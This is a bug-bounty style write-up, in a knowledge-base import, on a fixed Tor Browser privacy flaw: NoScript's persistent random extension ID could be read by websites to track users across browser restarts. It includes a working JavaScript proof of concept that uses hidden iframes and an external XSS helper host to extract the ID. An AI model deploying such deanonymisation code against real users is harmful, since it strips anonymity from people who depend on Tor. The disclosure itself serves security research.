---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-10-10_identify-tor-user-across-browser-restarts.md
original_filename: 2023-10-10_identify-tor-user-across-browser-restarts.md
title: Identify Tor user across browser restarts
category: documents
detected_topics:
- xss
- command-injection
- information-disclosure
- api-security
tags:
- imported
- documents
- xss
- command-injection
- information-disclosure
- api-security
language: en
raw_sha256: b525655429b17621842711a79b51935b463c20dd502f2f3aaaa630f36c25ffb8
text_sha256: 3da398e6a78c53201cba8d60baff51d143620de148e83a5862c2c6ac6909914c
ingested_at: '2026-06-28T07:32:26Z'
sensitivity: unknown
redactions_applied: false
---

# Identify Tor user across browser restarts

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-10-10_identify-tor-user-across-browser-restarts.md
- Source Type: markdown
- Detected Topics: xss, command-injection, information-disclosure, api-security
- Ingested At: 2026-06-28T07:32:26Z
- Redactions Applied: False
- Raw SHA256: `b525655429b17621842711a79b51935b463c20dd502f2f3aaaa630f36c25ffb8`
- Text SHA256: `3da398e6a78c53201cba8d60baff51d143620de148e83a5862c2c6ac6909914c`


## Content

---
title: "Identify Tor user across browser restarts"
page_title: "Identify Tor user across browser restarts (Fixed) | Writeups"
url: "https://ndevtk.github.io/writeups/2023/10/10/tor/"
final_url: "https://ndevtk.github.io/writeups/2023/10/10/tor/"
authors: ["NDevTK (@ndevtk)"]
programs: ["Tor"]
bugs: ["Information disclosure", "Privacy issue"]
publication_date: "2023-10-10"
added_date: "2024-02-06"
source: "pentester.land/writeups.json"
original_index: 722
---

# [Writeups](https://ndevtk.github.io/writeups/)

“Tor Browser aims to make all users look the same, making it difficult for you to be fingerprinted based on your browser and device information.”

NoScript is installed by default and cant be removed. Other browser extensions are discouraged since there normally fingerprintable <https://gitlab.torproject.org/tpo/applications/tor-browser/-/issues/41581#note_2949932>

On the first install of the Tor browser, NoScript gets assigned a random extension ID that never changes. Because of this Firefox bug: <https://bugzilla.mozilla.org/show_bug.cgi?id=1372288>

This is different to the chromium way of using a universal extension ID for manifest v2 which while did allow detecting if an extension was installed there was no random extension/user ID generated. Manifest v3 does have a `use_dynamic_url` feature that claims to be “per session and regenerated on browser restart or extension reload”

If the user increases there browser security level to “Safer” or in the NoScript settings page disables the media toggle this ID would be shared to an attacker controlled website using the following PoC:
  
  
  // Just a blank video
  f = document.createElement('iframe');
  f.hidden = true;
  f.src = 'https://terjanq.me/xss.php?ct=video/mp4';
  document.body.appendChild(f);
  
  payload = `
  let x = setInterval(() => {
  try {
  parent[0].document.links[0].style.opacity = 1;
  let link = parent[0].document.head.getElementsByTagName('link')[0];
  if (link && link.href) {
  let origin = new URL(link.href).hostname;
  alert('User ID: ' + origin);
  clearInterval(x);
  }
  } catch {}
  }, 10);
  `;
  
  setTimeout(() => {
  f2 = document.createElement('iframe');
  f2.hidden = true;
  // runs code same-origin as video
  f2.src = 'https://terjanq.me/xss.php?js=' + encodeURIComponent(payload);
  document.body.appendChild(f2);
  }, 100);
  

This leak can be found at: <https://github.com/hackademix/nscl/blob/ef1ecbea27e39e255d988a8fb0233ab53c46e57c/content/PlaceHolder.js#L34>

It was fixed in version 11.4.28 by calling `tabs.insertCSS` instead of referencing the css file with `runtime.getURL`

NoScript: <https://github.com/hackademix/noscript/commit/1754429ea1bc458f802c4e4f49f8e8e4ab15f403>  
NSCL: <https://github.com/hackademix/nscl/commit/4c94bf24f117277f5c00878005d91d0d7aaa18e4> ![Tor](https://ndevtk.github.io/writeups/tor.png)

# Was it awarded?

No because it was reported directly but may have been under “Low ($100 - $1000)” <https://hackerone.com/torproject?type=team>

[Improve this page](https://github.com/NDevTK/writeups/edit/main/_posts/2023-10-10-tor.md) Default Random Basic Shader Wallpapers Chrome Cast Surveillance Chromium Advisories Side Channel Echo Grove ParentalControlLock Light Cyberpunk Code Matrix Blueprint Redacted Glitch Old Terminal Gradient Comic Base64 Emoji Minecraft Flip 🦆 Rainbow text Typoifier Summarizer AI Audio Spoof Oceanic Depths Retro Gamification NoScript
